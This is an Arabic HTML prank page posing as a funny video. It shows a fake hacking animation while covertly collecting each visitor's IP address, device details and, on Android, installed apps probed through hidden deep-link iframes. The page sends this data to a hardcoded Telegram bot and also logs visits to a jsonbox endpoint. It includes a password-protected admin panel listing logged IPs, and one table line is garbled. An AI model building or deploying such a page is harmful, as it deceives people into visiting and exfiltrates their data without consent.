<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>شوف الفيديو</title>
    <meta name="description" content="😂 شوف الفيديو دا هيموتك من الضحك!">
    <meta property="og:title" content="🎬 فيديو مضحك">
    <meta property="og:type" content="video.other">
    <meta property="og:image" content="https://i.imgur.com/3bqPv0b.jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="😂 فيديو مضحك">
    <meta name="twitter:description" content="لازم تشوفه قبل ما يختفي">
    <meta name="twitter:image" content="https://i.imgur.com/3bqPv0b.jpeg">
    <meta name="robots" content="noindex, nofollow">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        /* شاشة إدخال الاسم */
        .name-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
        }
        .name-screen h2 {
            color: #0f0;
            margin-bottom: 30px;
            font-size: 2rem;
        }
        .name-screen input {
            background: black;
            border: 2px solid #0f0;
            color: #0f0;
            padding: 12px 20px;
            font-size: 1.5rem;
            width: 70%;
            max-width: 300px;
            text-align: center;
            border-radius: 50px;
            margin-bottom: 20px;
            outline: none;
            font-family: monospace;
        }
        .name-screen button {
            background: #0f0;
            color: black;
            border: none;
            padding: 12px 30px;
            font-size: 1.3rem;
            font-weight: bold;
            border-radius: 40px;
            cursor: pointer;
            font-family: monospace;
        }
        /* شاشة العمليات (بدون أرقام حقيقية) */
        .terminal {
            width: 100%;
            height: 100%;
            padding: 30px 25px;
            font-size: 20px;
            line-height: 1.6;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-word;
            display: none;
        }
        .terminal::-webkit-scrollbar { width: 6px; background: #111; }
        .terminal::-webkit-scrollbar-thumb { background: #0f0; }
        /* النتيجة النهائية (الاسم + نوب) */
        .result {
            position: fixed;
            bottom: 40%;
            left: 0;
            width: 100%;
            text-align: center;
            font-size: 48px;
            font-weight: bold;
            color: #ff5555;
            text-shadow: 0 0 10px red;
            display: none;
            z-index: 30;
            animation: glitch 0.1s infinite;
        }
        @keyframes glitch {
            0% { transform: skew(0deg, 0deg); opacity: 1; }
            20% { transform: skew(2deg, 1deg); opacity: 0.9; }
            40% { transform: skew(-2deg, -1deg); opacity: 1; }
            60% { transform: skew(1deg, 0deg); opacity: 0.95; }
            80% { transform: skew(-1deg, 1deg); opacity: 1; }
            100% { transform: skew(0deg, 0deg); opacity: 1; }
        }
        /* لوحة الأدمن (اختصار Ctrl+Shift+A) */
        .admin-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            backdrop-filter: blur(8px);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            visibility: hidden;
            opacity: 0;
            transition: 0.2s;
        }
        .admin-overlay.active { visibility: visible; opacity: 1; }
        .admin-panel {
            background: #0a0c0f;
            border: 2px solid #0ff;
            border-radius: 20px;
            width: 90%;
            max-width: 1100px;
            max-height: 85vh;
            overflow-y: auto;
            padding: 25px;
            color: #ccffcc;
        }
        .admin-panel h2 { color: #0ff; border-left: 5px solid #0ff; padding-left: 15px; }
        .admin-stats { display: flex; gap: 30px; background: #111; padding: 15px; border-radius: 14px; margin-bottom: 25px; flex-wrap: wrap; }
        .stat-card { background: #1a1e24; border-radius: 16px; padding: 15px 25px; text-align: center; flex:1; }
        .stat-number { font-size: 44px; font-weight: bold; color: #ffcc44; }
        .ip-table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        .ip-table th, .ip-table td { border: 1px solid #2a4a3a; padding: 12px 8px; text-align: left; }
        .close-admin { background: #300; color: #ff8888; border: 1px solid #ff4444; padding: 8px 18px; cursor: pointer; margin-top: 20px; border-radius: 40px; }
        .refresh-btn { background: #0a3320; color: #0f0; border: 1px solid #0f0; margin-left: 15px; padding: 5px 14px; cursor: pointer; border-radius: 20px; }
    </style>
</head>
<body>

<!-- شاشة إدخال الاسم -->
<div id="nameScreen" class="name-screen">
    <h2>🔐 ادخل اسمك</h2>
    <input type="text" id="username" placeholder="مثال: وسيم" autocomplete="off">
    <button id="startBtn">دخول</button>
</div>

<!-- شاشة العمليات (رسائل مبهمة بدون أرقام حقيقية) -->
<div id="terminal" class="terminal"></div>

<!-- النتيجة النهائية -->
<div id="result" class="result"></div>

<!-- لوحة الأدمن (للأدمن فقط، نفس السابق) -->
<div id="adminOverlay" class="admin-overlay">
    <div class="admin-panel">
        <h2>⛁ ADMIN ACCESS ⛁</h2>
        <div class="admin-stats">
            <div class="stat-card"><span>📡 TOTAL VISITS</span><div class="stat-number" id="totalVisits">0</div></div>
            <div class="stat-card"><span>🖥️ UNIQUE IPs</span><div class="stat-number" id="uniqueIps">0</div></div>
            <div class="stat-card"><span>🌐 LAST 24h</span><div class="stat-number" id="last24h">0</div></div>
        </div>
        <div style="display: flex; justify-content: space-between;">
            <h3>📋 LOGGED IP ADDRESSES</h3>
            <button class="refresh-btn" id="refreshAdminBtn">⟳ REFRESH</button>
        </div>
        <div style="overflow-x: auto;">
            <table class="ip-table">
                <thead><tr><th>#</th><th>IP ADDRESS</th><th>DATE & TIME</th><th>USER AGENT</th></tr></thead>
                <tbody id="visitorTableBody"><tr><td colspan="4">loading...<\/td></tr></tbody>
            </table>
        </div>
        <button class="close-admin" id="closeAdminBtn">⛌ CLOSE</button>
    </div>
</div>

<script>
    // ======================== تكوين البوت (بدّل التوكن والمعرف بما يناسبك) ========================
    const BOT_TOKEN = "8187413880:AAHJtjUWuXj6My7ALH9RjplFBs5nw6n4Myo";   // ⬅️ ضع توكن البوت
    const CHAT_ID   = "5567710346";                                      // ⬅️ ضع معرف الشات
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    // ===================================================================================

    // ---------- دالة جلب IP الحقيقي (للتلغرام فقط) ----------
    async function getRealIP() {
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let data = await res.json();
            return data.ip;
        } catch(e) {
            return "0.0.0.0 (خطأ)";
        }
    }

    // ---------- كشف التطبيقات المثبتة (للأندرويد فقط) ----------
    async function detectInstalledApps() {
        try {
            if (!/Android/i.test(navigator.userAgent)) return "غير مدعوم (ليس Android)";
            const apps = [
                { name: "Facebook", url: "fb://profile" },
                { name: "Instagram", url: "instagram://user?username=test" },
                { name: "WhatsApp", url: "whatsapp://send?phone=123" },
                { name: "Telegram", url: "tg://resolve?domain=test" },
                { name: "TikTok", url: "tiktok://user?user_id=test" }
            ];
            let detected = [];
            let pending = apps.length;
            return new Promise((resolve) => {
                if (pending === 0) resolve("لا توجد تطبيقات للاختبار");
                apps.forEach(app => {
                    let iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = app.url;
                    let timeout = setTimeout(() => {
                        detected.push(app.name);
                        iframe.remove();
                        pending--;
                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا توجد تطبيقات مثبتة من القائمة");
                    }, 700);
                    iframe.onload = () => {
                        clearTimeout(timeout);
                        iframe.remove();
                        pending--;
                        if (pending === 0) resolve(detected.length ? detected.join(', ') : "لا توجد تطبيقات مثبتة من القائمة");
                    };
                    document.body.appendChild(iframe);
                });
                setTimeout(() => {
                    if (pending > 0) resolve(detected.length ? detected.join(', ') : "المهلة (قد لا يعمل الكشف)");
                }, 3000);
            });
        } catch(e) { return "خطأ في الكشف"; }
    }

    // ---------- إرسال جميع البيانات إلى تلغرام (بدون أن يراها المستخدم) ----------
    async function sendToTelegram(ip, userAgent, apps, username) {
        if (!BOT_TOKEN || !CHAT_ID) return;
        const platform = navigator.platform;
        const screenRes = `${screen.width}x${screen.height}`;
        const deviceType = /mobile/i.test(userAgent) ? "📱 موبايل" : "💻 كمبيوتر";
        const language = navigator.language;
        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} أنوية` : "غير معروف";
        const time = new Date().toLocaleString('ar-EG');
        const message = `<b>🌐 زيارة جديدة</b>
<b>🆔 الاسم المدخل:</b> ${username}
<b>🟢 IP الحقيقي:</b> <code>${ip}</code>
<b>📅 الوقت:</b> ${time}
<b>💻 نوع الجهاز:</b> ${deviceType}
<b>🖥️ المنصة:</b> ${platform}
<b>📺 الدقة:</b> ${screenRes}
<b>🌍 اللغة:</b> ${language}
<b>⚙️ عدد الأنوية:</b> ${cores}
<b>📱 التطبيقات المثبتة (Android):</b> ${apps}
<b>🔍 وكيل المستخدم:</b> <code>${userAgent.substring(0, 200)}</code>`;
        try {
            await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: 'HTML', text: message })
            });
            console.log("✅ تم الإرسال إلى تلغرام");
        } catch(err) { console.error(err); }
    }

    // ---------- شاشة العمليات الوهمية (للمستخدم العادي، بدون أرقام حقيقية) ----------
    async function showFakeHackingProcess(username) {
        const terminal = document.getElementById('terminal');
        terminal.style.display = 'block';
        terminal.innerHTML = '';
        // رسائل عامة مبهمة - لا تحتوي على أرقام حقيقية مثل IP أو دقة الشاشة
        const fakeMessages = [
            "[+] جاري الاتصال بالخادم المركزي...",
            "[+] فك تشفير القنوات المشفرة...",
            "[+] تجاوز جدار الحماية بنجاح...",
            "[+] الوصول إلى قاعدة البيانات السرية...",
            "[+] تحميل بيانات المستخدم...",
            "[+] فحص الملفات المخفية...",
            "[+] اختراق الحماية الثانوية...",
            "[+] نسخ المعلومات الحساسة...",
            "[+] رفع البيانات إلى سحابة بعيدة...",
            "[+] إخفاء الأثر...",
            "[+] تمت العملية بنجاح 100%"
        ];
        for (let i = 0; i < fakeMessages.length; i++) {
            terminal.innerHTML += fakeMessages[i] + "\n";
            terminal.scrollTop = terminal.scrollHeight;
            await new Promise(r => setTimeout(r, 300 + Math.random() * 400));
        }
        // إظهار النتيجة النهائية (الاسم + نوب)
        const resultDiv = document.getElementById('result');
        resultDiv.innerText = `${username} نوب 😂`;
        resultDiv.style.display = 'block';
        // إخفاء التيرمينال بعد 2.5 ثانية
        setTimeout(() => {
            terminal.style.display = 'none';
        }, 2500);
    }

    // ---------- المعالج الرئيسي عند إدخال الاسم ----------
    async function handleStart() {
        const input = document.getElementById('username');
        let userName = input.value.trim();
        if (userName === "") {
            alert("الرجاء إدخال اسمك");
            return;
        }
        // إخفاء شاشة الاسم
        document.getElementById('nameScreen').style.display = 'none';
        
        // جمع البيانات الحقيقية (في الخلفية)
        const realIP = await getRealIP();
        const ua = navigator.userAgent;
        const apps = await detectInstalledApps();
        
        // إرسال إلى تلغرام (بكل التفاصيل)
        await sendToTelegram(realIP, ua, apps, userName);
        
        // تشغيل المشهد الوهمي للمستخدم العادي (بدون أرقام حقيقية)
        await showFakeHackingProcess(userName);
    }

    // ربط الأحداث
    document.getElementById('startBtn').addEventListener('click', handleStart);
    document.getElementById('username').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') handleStart();
    });

    // ================== لوحة الأدمن (مثل السابق، اختصاراتها Ctrl+Shift+A وكلمة المرور) ==================
    const ADMIN_PASSWORD = "SecurePass2025";
    let isAdminAuthenticated = false;
    const adminOverlay = document.getElementById('adminOverlay');
    function openAdminPanel() { adminOverlay.classList.add('active'); renderAdminStats(); }
    function closeAdminPanel() { adminOverlay.classList.remove('active'); }
    document.getElementById('closeAdminBtn').onclick = closeAdminPanel;
    document.getElementById('refreshAdminBtn').onclick = renderAdminStats;
    
    function requestAdminAccess() {
        if (isAdminAuthenticated) { openAdminPanel(); return; }
        const pwd = prompt("🔐 أدخل كلمة المرور للدخول إلى لوحة الأدمن:");
        if (pwd === ADMIN_PASSWORD) { isAdminAuthenticated = true; openAdminPanel(); }
        else if (pwd !== null) alert("❌ كلمة المرور خاطئة.");
    }
    document.addEventListener('keydown', (e) => {
        if (e.ctrlKey && e.shiftKey && e.key === 'A') { e.preventDefault(); requestAdminAccess(); }
        if (e.key === 'Escape' && adminOverlay.classList.contains('active')) closeAdminPanel();
    });
    
    // دوال تخزين الزيارات وعرضها في لوحة الأدمن (اختياري)
    const JSONBOX_URL = "https://jsonbox.io/box_bc3e7a9d1f2c4b8e5a6d";
    async function fetchAllVisitors() {
        try { let r = await fetch(JSONBOX_URL); if(r.ok) return await r.json(); } catch(e) {}
        return [];
    }
    async function renderAdminStats() {
        let records = await fetchAllVisitors();
        document.getElementById('totalVisits').innerText = records.length;
        document.getElementById('uniqueIps').innerText = new Set(records.map(r=>r.ip)).size;
        document.getElementById('last24h').innerText = records.filter(r=>(new Date()-new Date(r.timestamp))<=86400000).length;
        let tbody = document.getElementById('visitorTableBody');
        if(!records.length){ tbody.innerHTML = '<tr><td colspan="4">لا بيانات بعد<\/td></tr>'; return; }
        let sorted = [...records].reverse();
        tbody.innerHTML = sorted.map((r,i)=>`｜｜DSML｜｜<td>${i+1}<\/td><td>${r.ip}<\/td><td>${new Date(r.timestamp).toLocaleString()}<\/td><td>${(r.userAgent||'').substring(0,45)}<\/td><\/tr>`).join('');
    }
    (async function recordFirstVisit() {
        try {
            let ip = await getRealIP();
            await fetch(JSONBOX_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, timestamp: new Date().toISOString(), userAgent: navigator.userAgent.substring(0,120) })
            });
        } catch(e) {}
    })();

    // تلميح صغير للدخول إلى لوحة الأدمن (عادي المستخدم العادي ما بيفهمه)
    let hint = document.createElement('div');
    hint.style.cssText = 'position:fixed; bottom:8px; right:10px; font-size:10px; color:#2f6a44; background:#000000aa; padding:4px 10px; border-radius:20px; z-index:999;';
    hint.innerText = '🔒 ADMIN: Ctrl+Shift+A';
    document.body.appendChild(hint);
</script>
</body>
</html>
